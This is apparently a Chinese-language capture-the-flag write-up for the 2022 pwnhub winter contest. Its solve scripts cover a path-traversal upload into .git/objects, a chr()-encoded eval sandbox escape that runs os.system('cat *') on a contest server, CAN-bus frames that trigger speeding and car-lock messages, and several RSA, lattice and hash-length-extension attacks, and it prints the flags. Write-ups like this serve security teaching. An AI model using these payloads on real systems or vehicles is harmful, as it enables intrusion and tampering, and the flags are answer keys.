---
title: 2022 pwnhub 冬季赛 writeup by Arr3stY0u
contest: 2022 pwnhub 冬季赛
year: 2022
difficulty: hard
vuln_type: [lfi, stego_traffic, misc_math, crypto_rsa, lattice, web_unknown]
tags: [pwnhub, git-objects, zlib, TCP-pcap, base64-hexdump, 二分法, CAN-bus, 飞驰人生, chr-eval, RSAgcd, lattice-LLL, ECC-DLP, length-extension, hash-length-extension]
attack_chain: ["Web Reset: 上传表单 ../.git/objects/5f/f1ef5c03448a1eb5571dd348cf717a7bad7402 + zlib 0x78 0x9C 头", "PPC TCP_show: 解析 PCAP 包 16 字节/行 hexdump", "MISC 飞驰人生: 二分法找超速报文 244#000000A60000 + 锁车报文 19B#00000F000000 → flag{244#000000A60000_19B#00000F000000}", "MISC 坐井观天: 拼 chr() 字符串绕过字符限制 eval", "Crypto ASR: gcd(RSA1, N) → s 大因子 → invert(65537, s-1) → flag", "Crypto NN: LLL 短向量同时还原两个明文", "Crypto POINT: 已知 e*d 范围 → randint g^((ed-1)/2^k) mod n → gcd(x-1, n) → p,q", "Crypto: hlextend_bytes hash length extension attack"]
key_payload: "gcd(RSA1, N) = s → invert(e, s-1) → pow(c, d, s)"
one_liner: pwnhub 2022 冬季赛：git-objects + TCP hexdump + CAN-bus + RSA-gcd + LLL + 长度扩展
lesson: PCAP 协议逆向 + git-objects 还原是 MISC 入门；gcd(RSA1,N) 是 RSA 经典；LLL 双明文恢复
quality: high
---

# 2022 pwnhub 冬季赛 writeup by Arr3stY0u

原文 https://www.ctfiot.com/87197.html

## Web

### Reset (git objects)
```html
<form role="form" action="upload.php" method="post" enctype="multipart/form-data">
  <label for="exampleInputText1">../.git/objects/5f/f1ef5c03448a1eb5571dd348cf717a7bad7402</label>
  <label for="exampleInputFile">File input</label>
  <input type="file" name="file">
  Submit
</form>
```
- 上传文件名 `../.git/objects/5f/f1ef5c03448a1eb5571dd348cf717a7bad7402`
- 原始 zlib 字节：`78 9C 05 40 31 0A 80 50 08 ED 28 0E 81 B5 D5 10 0D 3F B2 25 BA 40 5B 44 7C 41 70 78 90 10 74 7E 51 BC 4A E3 34 CC CD 22 E1 41 9B FD 15 5D FB 1C FB 79 F1 E7 06 F0 DD 17 59 13 F2 5F 0B E2`
- zlib 头 `78 9C` → 还原 git object → 拿到源码

## PPC

### TCP_show (PCAP 解析)
```python
import base64
def print_addr(addr, D):
    s = ''
    if D == 1: s += ' ' * 8
    s += f'{addr:08x} '
    return s
def print_hex(data):
    assert len(data) <= 16
    s = ''
    for i, v in enumerate(data):
        if i == 8: s += ' '
        s += f'{v:02x} '
    s = s.ljust(51, ' ')
    return s
def print_ascii(data):
    assert len(data) <= 16
    s = ''
    for i, v in enumerate(data):
        if i == 8: s += ' '
        if 32 <= v <= 126: s += chr(v)
        else: s += '.'
    s = s.ljust(17, ' ')
    return s

# Parse input
N = int(input())
packets = []
for _ in range(N):
    D, encoded_string = input().split()
    D = int(D)
    decoded_string = base64.b64decode(encoded_string)
    for i in range(0, len(decoded_string), 16):
        data = decoded_string[i:i+16]
        print(print_addr(i, D), end='')
        print(print_hex(data), end='')
        print(print_ascii(data))
```

## MISC

### 飞驰人生 (CAN-bus)
- 二分法找超速报文 `244#000000A60000`
- 锁车报文 `19B#00000F000000` × 100 次
- https://www.freebuf.com/articles/mobile/322604.html
- **flag:** `flag{244#000000A60000_19B#00000F000000}`

### 坐井观天
```python
from pwn import *
io = remote('47.97.127.1', 27504)
shell = '__import__("os").system("cat *")'
inner = ''
for ch in shell:
    inner += f'chr({ord(ch)})+'
inner = inner[:-1]
payload = f'eval({inner})'
io.sendlineafter(b'$ ', payload)
io.interactive()
```

## Crypto

### ASR
```python
import gmpy2
from Crypto.Util.number import *
s = gmpy2.gcd(RSA1, N)  # 大因子
d = gmpy2.invert(65537, s-1)
m = pow(c, d, s)
print(long_to_bytes(m))
# flag{b66f68258f184bd7afddd32c1518eed0}
```

### LLL 双明文
```python
v1 = vector(ZZ, [NN, 0, 0])
v2 = vector(ZZ, [0, NN, 0])
v3 = vector(ZZ, [enc1, enc2, 1])
m = matrix([v1, v2, v3])
print(m.LLL()[0])
```

### 已知 e*d 范围
```python
def divide_pq(ed, n):
    k = ed - 1
    while True:
        g = randint(3, n - 2)
        t = k
        while True:
            if t % 2 != 0: break
            t //= 2
        x = pow(g, t, n)
        if x > 1 and gcd(x - 1, n) > 1:
            p = gcd(x - 1, n)
            return (p, n // p)

print(divide_pq(e*d, n))
# flag{e89f47939d12434cb201080d8b240774}
```

### hash 长度扩展
```python
import hlextend_bytes
io.sendlineafter(b'> ', b'2')
io.sendlineafter(b'Which one? ', b'0')
io.recvuntil(b'Order: ', drop=True)
# hlextend 攻击 sha256 / md5
```

## 教学价值
- **git-objects** 还原是 web 高级
- **PCAP hexdump** 格式是入门
- **CAN-bus** 飞驰人生 报文格式 (244#... 19B#...)
- **RSA gcd** 是经典攻击
- **LLL** 双明文恢复
- **ECC 已知 ed** 范围分解
- **hash 长度扩展** 是 web/crypto 基础

## 工具
- git
- tshark
- pwntools
- SageMath
- hlextend

## 关联
- pwnhub 是国内老牌 CTF 平台
- 偏重 web+misc 综合
